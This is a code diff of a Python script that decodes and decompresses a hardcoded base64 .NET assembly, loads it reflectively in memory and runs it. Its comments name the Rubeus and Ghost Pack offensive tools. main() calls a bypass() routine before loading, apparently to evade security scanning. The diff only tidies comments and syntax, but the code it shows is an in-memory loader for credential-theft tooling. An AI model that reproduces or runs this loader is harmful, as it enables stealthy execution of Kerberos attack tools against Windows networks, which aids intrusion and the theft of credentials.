@@ -58,13 +58,8 @@ def base64_to_bytes(base64_string):
         A .NET byte array of the decompressed data.
     """
 
-    # Decode the base64 string to get the compressed binary data
     compressed_data = base64.b64decode(base64_string)
-
-    # Decompress the data
     decompressed_data = zlib.decompress(compressed_data)
-
-    # Convert the decompressed binary data to a .NET byte array
     return System.Array[System.Byte](decompressed_data)
 
 
@@ -78,14 +73,8 @@ def load_and_execute_assembly(command):
     """
 
     assembly_bytes = base64_to_bytes(base64_str)
-
-    # Load the assembly
     assembly = Assembly.Load(assembly_bytes)
-
-    # Get the type of the Rubeus.Program class
     program_type = assembly.GetType('<replace_programname>.Program')
-
-    # You don't need to create an instance of the class for a static method
     method = program_type.GetMethod('MainString')
 
     # Have to do this nesting thing to deal with different main entry points and public/private methods
@@ -100,29 +89,22 @@ def load_and_execute_assembly(command):
         command_array = Array[str]([command])
         command_args = System.Array[System.Object]([command_array])
     else:
-
         # Ghost Pack stuff like Rubeus uses a different input
         command_args = Array[str]([command])
 
-    # Invoke the MainString method
     result = method.Invoke(None, command_args)
-
     return result
 
 
 def main():
     bypass()
-    parser = \
-        argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly'
-                                )
+    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
     parser.add_argument('command', type=str, nargs='?', default='',
                         help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.'
                         )
-
     args = parser.parse_args()
-
     result = load_and_execute_assembly(args.command)
-    print result
+    print(result)
 
 
 if __name__ == '__main__':
